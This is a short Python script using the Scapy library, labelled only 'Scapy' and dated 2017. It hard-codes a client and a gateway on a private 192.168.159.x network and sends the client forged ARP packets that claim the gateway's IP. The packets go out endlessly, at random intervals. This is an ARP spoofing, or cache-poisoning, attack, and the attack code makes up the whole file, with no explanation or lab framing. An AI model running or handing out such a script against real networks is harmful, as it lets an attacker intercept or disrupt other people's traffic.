# -*- coding:Utf8 -*-

#################################
# Title : Scapy			#
# Date 	: 06/09/2017		#
# Auteur : GCO  		#
#################################



########### fuction #############


	

########### body ################

from scapy.all import *


clientMAC = '00:0c:29:9a:b2:f3'
client =  '192.168.159.129' 
gateway = '192.168.159.254'




send( Ether(dst=clientMAC)/ARP(op="who-has", psrc=gateway, pdst=client),
      inter=RandNum(10,40), loop=1 )
